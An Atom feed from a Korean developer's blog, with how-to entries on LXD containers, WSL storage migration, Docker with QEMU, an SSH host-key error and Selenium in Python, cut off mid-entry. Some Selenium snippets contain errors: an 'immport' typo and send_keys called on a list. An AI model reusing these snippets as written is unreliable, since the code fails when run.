<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-11-08T13:22:57+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">LXD 설치 및 사용법</title><link href="http://localhost:4000/linux/ubuntu/LXD_%EC%84%A4%EC%B9%98%EB%B0%8F%EC%82%AC%EC%9A%A9/" rel="alternate" type="text/html" title="LXD 설치 및 사용법" /><published>2024-11-08T00:00:00+00:00</published><updated>2024-11-08T14:13:00+00:00</updated><id>http://localhost:4000/linux/ubuntu/LXD_%EC%84%A4%EC%B9%98%EB%B0%8F%EC%82%AC%EC%9A%A9</id><content type="html" xml:base="http://localhost:4000/linux/ubuntu/LXD_%EC%84%A4%EC%B9%98%EB%B0%8F%EC%82%AC%EC%9A%A9/"><![CDATA[<h1 id="lxd">LXD</h1>
<p>lxd 는 안전하고 강력한 시스템 컨테이너 및 가상머신 관리자이다.</p>

<p>lxd 를 사용하여 컨테이너를 사용한 완전한 리눅스 시스템 및 가상머신을 동작 및 관리할 수 있다. lxd 는 공식 우분투 이미지 및 커뮤니티에서 제공하는 이미지들을 지원한다.</p>

<p>lxd 를 이용하여 쉽게 컨테이너 및 가상머신을 구성할 수 있다.</p>

<p>만약 효율적으로 가상머신이나 다른 리눅스 환경인 컨테이너를 구성하기 원한다면, lxd 사용을 한번 고려해 볼 수 있다.</p>

<hr />
<h2 id="lxd-설치">LXD 설치</h2>
<p>snap 패키지를 사용하여 lxd 쉽게 설치할 수 있다. 기본적으로 우분투 환경에서는 snap 을 사용해서 설치하는게 편하다.</p>

<h3 id="1-snapd-설치-확인하기">1. snapd 설치 확인하기.</h3>
<p>1-1. <code class="language-plaintext highlighter-rouge">snap version</code> 을 이용하여 snapd 가 설치되어 있는지 확인할 수 있다.<br />
<img src="https://github.com/user-attachments/assets/6643fc44-28f1-4ac1-8176-0ebed2dedefe" alt="image" /></p>

<p><br />1-2. 만약 snap 이 설치되어 있지 않다면 다음 명령을 이용하여 최신 버전의 snap을 이용할 수 있다.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install snapd
</code></pre></div></div>

<h3 id="2-snap-을-이용하여-lxd-설치하기">2. snap 을 이용하여 lxd 설치하기.</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo snap install lxd
</code></pre></div></div>

<p>다음 명령을 사용하여 lxd와 lxc 버전이 출력이 되면 성공적으로 lxd 설치한 것이다.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo lxc --version
$ sudo lxd --version
</code></pre></div></div>
<p><img src="https://github.com/user-attachments/assets/58fba97d-527e-4e9b-9eb8-c0666b136965" alt="image" /></p>

<h3 id="3-현재-사용자가-lxd-group-에-속하는지-확인하기">3. 현재 사용자가 lxd group 에 속하는지 확인하기.</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ id
</code></pre></div></div>
<p>lxd 그룹에 속해 있으면 id 명령어 결과에 lxd가 존재하는 것을 확인할 수 있다.</p>

<p>만약 lxd 그룹에 속해 있지 않다면, usermod 명령어를 이용하여 현재 사용자를 lxd 그룹에 추가해주면 된다. 그룹에 추가해주면 sudo 권한 없이 lxc 를 이용할 수 있다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo usermod -aG lxd [사용자 명]

예시
$ sudo usermod -aG lxd user1
</code></pre></div></div>
<p><img src="https://github.com/user-attachments/assets/2ec260c3-d35b-4594-b116-64c49370293e" alt="image" /></p>

<h3 id="4-lxd-초기화-하기">4. lxd 초기화 하기.</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ lxd init
</code></pre></div></div>
<p>이 명령을 통해 컨테이너와 가상머신을 만들때 사용하는 default 프로필, storage 그리고 가상 네트워크를 만든다.</p>

<p>현재 생성된 프로필 목록이나 프로필 내용, storage 목록, 네트워크를 확인하기 위해서는 다음 명령어를 이용하면 된다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>프로필 목록 확인
$ lxc profile list

프로필 내용 확인
$ lxc profile show [프로필 이름]
</code></pre></div></div>
<p><img src="https://github.com/user-attachments/assets/76dc4138-bf70-451b-93b4-2facc0358ace" alt="image" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>storage 목록 확인
$ lxc storage list
</code></pre></div></div>
<p><img src="https://github.com/user-attachments/assets/eb687706-5d90-468d-9414-6ad0c1dd8ffe" alt="image" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>새로 생성된 네트워크 확인
$ ip addr
</code></pre></div></div>

<h2 id="lxd-사용법">LXD 사용법</h2>
<p>이미지 서버를 통해 이미지를 로드하고 컨테이너나 가상머신을 구동할 수 있다.</p>

<p>다음 명령을 통해 이용할 수 있는 이미지 목록을 확인할 수 있다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ lxc images list [이미지 서버]

예시
$ lxc images list ubuntu:
$ lxc images list images:
$ lxc images list ubuntu-minimal:
</code></pre></div></div>

<h3 id="1-c1-이름의-우분투-컨테이너-만들기">1. c1 이름의 우분투 컨테이너 만들기.</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ lxc launch ubuntu:24.04 c1
</code></pre></div></div>

<h3 id="2-vm1-이름의-우분투-가상머신-만들기">2. vm1 이름의 우분투 가상머신 만들기.</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ lxc launch ubuntu:24.04 vm1 --vm
</code></pre></div></div>

<h3 id="3-생성된-컨테이너-및-가상머신-목록-확인하기">3. 생성된 컨테이너 및 가상머신 목록 확인하기.</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ lxc list
</code></pre></div></div>
<p><img src="https://github.com/user-attachments/assets/0ebd3e98-482f-4e41-b4a7-7f8018ee73a3" alt="image" /></p>

<h3 id="4-컨테이너-실행하기">4. 컨테이너 실행하기.</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell 모드 실행하기
$ lxc exec [컨테이너 명] /bin/bash

컨테이너 또는 가상머신에서 특정 명령어 실행하기
$ lxc exec [컨테이너 명] -- pwd
</code></pre></div></div>

<h3 id="5-사용하지-않는-컨테이너-또는-가상머신-삭제하기">5. 사용하지 않는 컨테이너 또는 가상머신 삭제하기.</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ lxc stop [컨테이너 또는 가상머신 이름]
$ lxc delete [컨테이너 또는 가상머신 이름]

강제로 삭제하기 또는 중지하기
$ lxc delete [컨테이너 또는 가상머신 이름] --force
$ lxc stop [컨테이너 또는 가상머신 이름] --force
</code></pre></div></div>

<h2 id="인스턴스-옵션-설정">인스턴스 옵션 설정</h2>
<p>각 인스터스에 몇 가지 옵션을 추가해줄 수 있다.</p>

<h3 id="cpu-및-메모리-사용량-제한-설정">cpu 및 메모리 사용량 제한 설정</h3>
<p>새로운 컨테이너를 생성할 때 옵션을 추가하거나 기존에 존재하는 컨테이너에 새로운 설정을 추가해줄 수 있다.<br /></p>

<h4 id="1-새로운-컨테이너를-생성할-때-설정-추가">1. 새로운 컨테이너를 생성할 때 설정 추가.</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ lxc launch ubuntu:24.04 c2 --config limits.cpu=1 --config limits.memory=192MiB

설정 확인
$ lxc config show c2
</code></pre></div></div>

<h4 id="2-기존에-존재하는-컨테이너에-새로운-옵션을-추가">2. 기존에 존재하는 컨테이너에 새로운 옵션을 추가.</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ lxc config set c2 limits.memory=256MiB
</code></pre></div></div>

<h3 id="host-폴더-마운트-즉-공유폴더-설정host--container">host 폴더 마운트 즉 공유폴더 설정(host &lt;&gt; container)</h3>
<p>host와 컨테이너가 서로 접근할 수 있는 접근폴더를 만들 수 있다. 이 공유 폴더를 통해 파일을 쉽게 옮길 수 있다.</p>

<h4 id="1-공유-폴더-추가하기">1. 공유 폴더 추가하기</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ lxc config device add [container name] [config name] disk source=/path/to/host-folder path=/path/to/container-path

예시
$ lxc config device add c1 share-folder disk source=/path/to/host-folder path=/path/to/container-path

추가한 설정 확인하기
$ lxc config device show [container name]
</code></pre></div></div>

<h4 id="2-공유-폴더-소유자-설정하기">2. 공유 폴더 소유자 설정하기.</h4>
<p>공유폴더 소유자를 설정하기 전 컨테이너의 uid 범위를 확인한다.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>컨테이너 안에서 확인
$ cat /proc/self/uid_map

사용자 uid 확인
$ id
</code></pre></div></div>
<p><br />
<code class="language-plaintext highlighter-rouge">uid_map</code> 파일을 확인하여 root 가 0 이 아닌 1000000에서 시작하는 것을 확인할 수 있다. 즉 host에서 uid <code class="language-plaintext highlighter-rouge">1000000</code> 사용자가 컨테이너에서는 root 사용자가 되는것이다. 그리고 container 내부에서 사용자 uid 를 확인할 수 있다. 즉 host 에서 uid <code class="language-plaintext highlighter-rouge">1000000+사용자uid</code> 가 컨테이너 내에서 사용자 uid 가 된다.</p>

<p>이 점을 활용하여 폴더 소유권을 컨테이너의 사용자가 되도록 host 에서 변경해 줄 수 있다.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>host 에서 container 와 공유중인 폴더의 소유권을 변경.

예시 : host uid 1001000 가 컨테이너에서 사용자라고 가정하자.
$ sudo chown 1001000:1001000 share_folder 

확인하기.
$ ls -al /path/to/share_folder
$ lxc exec [컨테이너 명] -- ls -al /path/to/share_folder
</code></pre></div></div>
<p><img src="https://github.com/user-attachments/assets/5e008589-8b5b-4e32-b50e-1d55e27ac09c" alt="image" /></p>

<p>컨테이너에서 공유폴더를 사용자가 소유하고 있다는 것을 확인할 수 있다.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ lxc exec [컨테이너 명] -- ls -al /path/to/share_folder
</code></pre></div></div>

<h2 id="기본-storage-용량-늘리기">기본 storage 용량 늘리기</h2>
<p>lxd 초기화 할 때 설정한 용량이 부족할 때 늘려줄 수 있다. 생성한 컨테이너가 존재할 때 용량 늘리기만 가능하고 용량을 줄이려면 생성한 모든 컨테이너를 삭제해야한다.</p>

<h3 id="1-storage-이름-알아내기">1. storage 이름 알아내기</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ lxc storage list
</code></pre></div></div>

<h3 id="2-현재-설정된-용량-알아내기">2. 현재 설정된 용량 알아내기</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ lxc storage info [storage name]
</code></pre></div></div>

<h3 id="3-용량-늘리기">3. 용량 늘리기</h3>
<p>컨테이너가 존재하면 오직 늘리기만 가능하며, 컨테이너를 모두 삭제해야 용량을 줄일 수 있다.</p>

<p>vim 을 사용하는 것과 유사한 방식으로 용량을 수정해주면 된다.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ lxc storage edit [storage name]
</code></pre></div></div>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://ubuntu.com/server/docs/lxd-containers#kernel-preparation">lxd container</a></li>
  <li><a href="https://yoo11052.tistory.com/84">리눅스 그룹 추가 방법</a></li>
  <li><a href="https://stackoverflow.com/questions/76768718/how-to-resize-an-ubuntu-lxc-lxd-container">lxd container storage size up</a></li>
  <li><a href="https://m.blog.naver.com/seek316/222407819590">소유권 변경하기</a></li>
  <li><a href="https://documentation.ubuntu.com/lxd/en/latest/profiles/#edit-a-profile">edit a profile</a></li>
  <li><a href="https://ubuntu.com/blog/custom-user-mappings-in-lxd-containers">uid &amp; gid</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="linux" /><category term="ubuntu" /><category term="container" /><category term="lxd" /><category term="lxc" /><summary type="html"><![CDATA[LXD 를 설치하고 사용해보기.]]></summary></entry><entry><title type="html">Debian 계열 Linux Chrome 한글 깨짐 해결법</title><link href="http://localhost:4000/ubuntu/linux/Debian%EA%B3%84%EC%97%B4%ED%95%9C%EA%B8%80%EA%B9%A8%EC%A7%90%ED%95%B4%EA%B2%B0%EB%B2%95/" rel="alternate" type="text/html" title="Debian 계열 Linux Chrome 한글 깨짐 해결법" /><published>2024-01-26T00:00:00+00:00</published><updated>2024-01-26T14:13:00+00:00</updated><id>http://localhost:4000/ubuntu/linux/Debian%EA%B3%84%EC%97%B4%ED%95%9C%EA%B8%80%EA%B9%A8%EC%A7%90%ED%95%B4%EA%B2%B0%EB%B2%95</id><content type="html" xml:base="http://localhost:4000/ubuntu/linux/Debian%EA%B3%84%EC%97%B4%ED%95%9C%EA%B8%80%EA%B9%A8%EC%A7%90%ED%95%B4%EA%B2%B0%EB%B2%95/"><![CDATA[<h2 id="칼리리눅스-크롬-브라우저">칼리리눅스 크롬 브라우저</h2>
<ul>
  <li>한글이 깨지는 것을 확인할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4dc1c7eb-d737-454c-8982-6bc5ae14585b" alt="Pasted image 20240125153018" /></li>
</ul>

<h2 id="한글-깨짐-해결법">한글 깨짐 해결법</h2>

<ol>
  <li>
    <p>저장소 패키지를 먼저 업데이트 해준다.<br /><script src="https://gist.github.com/MinGyu2/ec55ecbd3ef6f8ada551c399226353b7.js"></script></p>
  </li>
  <li>
    <p>한글 패키지 설치하기.<br /><script src="https://gist.github.com/MinGyu2/ee0c484a8fbf587cba129880cc824478.js"></script></p>
  </li>
  <li>
    <p>한글이 잘보이는 것을 확인할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/223b257f-c547-4889-a298-2112c9c7e9bf" alt="Pasted image 20240125153354" /></p>
  </li>
</ol>

<h2 id="참고-사이트">참고 사이트</h2>

<ul>
  <li><a href="https://vtam.net/121">칼리 리눅스 한글 깨짐 현상해결</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="ubuntu" /><category term="linux" /><category term="linux" /><category term="debian" /><summary type="html"><![CDATA[Linux 한글 깨짐 해결 방법.]]></summary></entry><entry><title type="html">WSL 저장 공간(VHDX) 위치 옮기기</title><link href="http://localhost:4000/windows/wsl_vhdx%EC%98%AE%EA%B8%B0%EA%B8%B0/" rel="alternate" type="text/html" title="WSL 저장 공간(VHDX) 위치 옮기기" /><published>2023-12-06T00:00:00+00:00</published><updated>2023-12-06T14:13:00+00:00</updated><id>http://localhost:4000/windows/wsl_vhdx%EC%98%AE%EA%B8%B0%EA%B8%B0</id><content type="html" xml:base="http://localhost:4000/windows/wsl_vhdx%EC%98%AE%EA%B8%B0%EA%B8%B0/"><![CDATA[<ul>
  <li>wsl 저장 공간 위치를 옮겨보자.</li>
</ul>

<h2 id="wsl-이름-확인">WSL 이름 확인</h2>

<ul>
  <li>명령 프롬프트 창에서 다음 명령어를 통해 wsl 이름을 확인할 수 있다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; wsl -l -v
  NAME      STATE           VERSION
* Ubuntu    Running         2
</code></pre></div></div>

<h2 id="wsl-리눅스-동작-정지-시키기">WSL 리눅스 동작 정지 시키기</h2>

<ul>
  <li>먼저 동작중인 WSL 을 중지해야 한다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 모든 WSL 중지시키기.
&gt; wsl --shutdown
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 특정 WSL 리눅스 정지하기.
&gt; wsl --terminate [wsl 이름]
</code></pre></div></div>

<h2 id="export-하기">EXPORT 하기</h2>

<ul>
  <li>tar 파일로 WSL Linux 를 백업할 수 있다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; wsl --export [wsl 이름] [백업(저장) 위치 및 파일 이름]
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; wsl --export Ubuntu D:\wsl-vhdx\ubuntu-backup.tar
</code></pre></div></div>

<h2 id="백업한-리눅스-wsl-에서-지우기">백업한 리눅스 WSL 에서 지우기</h2>

<ul>
  <li>WSL 에서 배포를 제거하고 해당 LINUX 배포와 연결된 모든 데이터를 삭제할 수 있다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; wsl --unregister [wsl 이름]
</code></pre></div></div>

<h2 id="import-하기">IMPORT 하기</h2>

<ul>
  <li>
    <p>백업할 LINUX WSL 버전을 입력해 주어야한다.</p>
  </li>
  <li>wsl 이름(직접 지정) : wsl linux 이름을 의미한다.</li>
  <li>설치 경로 : 저장 공간 경로를 의미한다.</li>
  <li>백업(저장)한 파일 위치 : export 로 추출한 tar 파일 경로를 의미한다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; wsl --import [wsl 이름(직접 지정)] [설치 경로] [백업(저장)한 파일 위치] --version 2
</code></pre></div></div>

<h2 id="default-user-설정">Default User 설정</h2>

<ul>
  <li><code class="language-plaintext highlighter-rouge">/etc/wsl.conf</code> (WSL Linux) 의 파일에 default 유저를 등록해주어야 한다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[user]
default=mq
</code></pre></div></div>

<h2 id="default-wsl-linux-설정">Default WSL Linux 설정</h2>

<ul>
  <li>디펄트 설정 (windows)</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; wsl --setdefault [wsl 이름(직접 지정한 이름)]
</code></pre></div></div>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://sonhc.tistory.com/900">WSL 사용시 ext4.vhdx 저장되는 BasePath 위치 확인 :: sonhc’s Inventorys (tistory.com)</a></li>
  <li><a href="https://learn.microsoft.com/ko-kr/windows/wsl/use-custom-distro">WSL과 함께 사용할 Linux 배포 가져오기 Microsoft Learn</a></li>
  <li><a href="https://learn.microsoft.com/ko-kr/windows/wsl/basic-commands">WSL의 기본 명령 Microsoft Learn</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="windows" /><category term="wsl" /><summary type="html"><![CDATA[WSL 저장 공간(VHDX) 위치를 옮겨보자!]]></summary></entry><entry><title type="html">Docker + QEMU</title><link href="http://localhost:4000/ubuntu/dockerAndqemu/" rel="alternate" type="text/html" title="Docker + QEMU" /><published>2023-11-02T00:00:00+00:00</published><updated>2023-11-10T14:13:00+00:00</updated><id>http://localhost:4000/ubuntu/dockerAndqemu</id><content type="html" xml:base="http://localhost:4000/ubuntu/dockerAndqemu/"><![CDATA[<ul>
  <li>다른 아키텍처 이미지를 동작시키기 위해서는 qemu 가 필요하다.</li>
</ul>

<h2 id="docker-설치">Docker 설치</h2>

<ul>
  <li><a href="https://mingyu2.github.io/">기록하는 개발자 (mingyu2.github.io)</a></li>
</ul>

<h2 id="리눅스-binfmt">리눅스 <a href="https://github.com/tonistiigi/binfmt">binfmt</a></h2>

<ul>
  <li>다른 아키텍처의 컨테이너를 만들기 위해서는 먼저 아래 명령어를 통해 추가 설치해주면 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker run --privileged --rm tonistiigi/binfmt --install all
</code></pre></div></div>

<ul>
  <li>설치 확인.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker buildx ls
</code></pre></div></div>

<h2 id="테스트-실행">테스트 실행</h2>

<ul>
  <li>
    <p>host 컴퓨터와 다른 아키텍처의 이미지 컨테이너를 생성 및 실행할 수 있다.</p>
  </li>
  <li>
    <p>host 컴퓨터</p>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ uname -a

Linux  5.15.90.1-microsoft-standard-WSL2 #1 SMP Fri Jan 27 02:56:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
</code></pre></div></div>

<ul>
  <li>arm64 아키텍처 컨테이너</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker run --rm -it --platform linux/arm64 ubuntu:latest uname -a

Linux 135f72d2febe 5.15.90.1-microsoft-standard-WSL2 #1 SMP Fri Jan 27 02:56:13 UTC 2023 aarch64 aarch64 aarch64 GNU/Linux
</code></pre></div></div>

<ul>
  <li>amd64 아키텍처 컨테이너</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker run --rm -it --platform linux/amd64 ubuntu:latest uname -a

Linux 4a0c73349a8f 5.15.90.1-microsoft-standard-WSL2 #1 SMP Fri Jan 27 02:56:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
</code></pre></div></div>

<h2 id="참고사이트">참고사이트</h2>
<ul>
  <li><a href="https://www.qemu.org/download/#linux">Download QEMU - QEMU</a></li>
  <li><a href="https://docs.docker.com/build/drivers/docker-container/#qemu">Docker container build driver - Docker Docs</a></li>
  <li><a href="https://velog.io/@koo8624/Docker-Buildx%EB%A1%9C-cross-platform-%EC%9D%B4%EB%AF%B8%EC%A7%80-%EB%B9%8C%EB%93%9C%ED%95%98%EA%B8%B0">Docker Buildx로 cross-platform 이미지 빌드하기 (velog.io)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="ubuntu" /><category term="docker" /><summary type="html"><![CDATA[host 아키텍처와 다른 docker 이미지를 동작시켜보자.]]></summary></entry><entry><title type="html">SSH 연결 오류(Host key verification failed.)</title><link href="http://localhost:4000/ssh/error/SSH_%EC%97%B0%EA%B2%B0_%EC%97%90%EB%9F%AC/" rel="alternate" type="text/html" title="SSH 연결 오류(Host key verification failed.)" /><published>2023-10-26T00:00:00+00:00</published><updated>2023-10-26T14:13:00+00:00</updated><id>http://localhost:4000/ssh/error/SSH_%EC%97%B0%EA%B2%B0_%EC%97%90%EB%9F%AC</id><content type="html" xml:base="http://localhost:4000/ssh/error/SSH_%EC%97%B0%EA%B2%B0_%EC%97%90%EB%9F%AC/"><![CDATA[<h2 id="ssh-오류-해결법--host-key-verification-failed-">SSH 오류 해결법 ( Host key verification failed. )</h2>

<ul>
  <li>이전에 접속한 키로 계속 접근을 시도하여 발생하는 문제이다.</li>
  <li>즉 다른 서버인데 (아이피 주소는 같음) 이전 서버의 키로 접근할려 하여 발생하는 문제이다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host key verification failed.

$ ssh-keygen -R [아이피 주소]
</code></pre></div></div>]]></content><author><name>Jung MinGyu</name></author><category term="ssh" /><category term="error" /><category term="ssh" /><summary type="html"><![CDATA[Selenium 사용할 때 유용한 정보를 정리해 보았다.]]></summary></entry><entry><title type="html">Selenium in Python 유용한 정보</title><link href="http://localhost:4000/%EA%B8%B0%EC%88%A0/SeleniumInPython/" rel="alternate" type="text/html" title="Selenium in Python 유용한 정보" /><published>2023-10-19T00:00:00+00:00</published><updated>2023-10-19T14:13:00+00:00</updated><id>http://localhost:4000/%EA%B8%B0%EC%88%A0/SeleniumInPython</id><content type="html" xml:base="http://localhost:4000/%EA%B8%B0%EC%88%A0/SeleniumInPython/"><![CDATA[<h2 id="selenium-브라우저-드라이버-경로-주기">Selenium 브라우저 드라이버 경로 주기</h2>

<ul>
  <li>브라우저 드라이버 경로를 직접 설정해 줄 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">from</span> <span class="n">selenium.webdriver.edge.service</span> <span class="kn">import</span> <span class="n">Service</span>

<span class="n">edge_path</span> <span class="o">=</span> <span class="sh">'</span><span class="s">msedgedriver.exe</span><span class="sh">'</span>
<span class="n">service</span> <span class="o">=</span> <span class="nc">Service</span><span class="p">(</span><span class="n">executable_path</span><span class="o">=</span><span class="n">edge_path</span><span class="p">)</span>
<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">Edge</span><span class="p">(</span><span class="n">service</span> <span class="o">=</span> <span class="n">service</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="selenium-find_element-or-find_elements">Selenium find_element or find_elements</h2>
<ul>
  <li>find_element 또는 find_elements 를 통해 원하는 element를 얻어줄 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">from</span> <span class="n">selenium</span><span class="p">.</span><span class="n">webdriver</span><span class="p">.</span><span class="n">common</span><span class="p">.</span><span class="n">by</span> <span class="n">immport</span> <span class="n">By</span>

<span class="n">driver</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">XPATH</span><span class="p">,</span> <span class="sh">'</span><span class="s">...</span><span class="sh">'</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span><span class="sh">'</span><span class="s">ID</span><span class="sh">'</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">NAME</span><span class="p">,</span><span class="sh">'</span><span class="s">NAME</span><span class="sh">'</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">CLASS_NAME</span><span class="p">,</span> <span class="sh">'</span><span class="s">Class name</span><span class="sh">'</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">CSS_SELECTOR</span><span class="p">,</span> <span class="sh">'</span><span class="s">selector</span><span class="sh">'</span><span class="p">)</span>

<span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">XPATH</span><span class="p">,</span> <span class="sh">'</span><span class="s">...</span><span class="sh">'</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span><span class="sh">'</span><span class="s">ID</span><span class="sh">'</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">NAME</span><span class="p">,</span><span class="sh">'</span><span class="s">NAME</span><span class="sh">'</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">CLASS_NAME</span><span class="p">,</span> <span class="sh">'</span><span class="s">Class name</span><span class="sh">'</span><span class="p">)</span>
<span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">CSS_SELECTOR</span><span class="p">,</span> <span class="sh">'</span><span class="s">selector</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="selenium-클릭">Selenium 클릭</h2>
<ul>
  <li>먼저 element 를 찾아주어야 한다. ( 클릭할 element 찾아주기. )</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bt</span> <span class="o">=</span> <span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span><span class="sh">'</span><span class="s">ID</span><span class="sh">'</span><span class="p">)</span>

<span class="n">bt</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">click</span><span class="p">()</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">selenium.webdriver.common.keys</span> <span class="kn">import</span> <span class="n">Keys</span>

<span class="n">bt</span> <span class="o">=</span> <span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span><span class="sh">'</span><span class="s">ID</span><span class="sh">'</span><span class="p">)</span>
<span class="n">bt</span><span class="p">.</span><span class="nf">send_keys</span><span class="p">(</span><span class="n">Keys</span><span class="p">.</span><span class="n">ENTER</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="selenium-글-입력">Selenium 글 입력</h2>
<ul>
  <li>element (input 등) 에 사용자 입력을 넣어줄 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id</span> <span class="o">=</span> <span class="n">driver</span><span class="p">.</span><span class="nf">find_elements</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span><span class="sh">'</span><span class="s">login_id</span><span class="sh">'</span><span class="p">)</span>
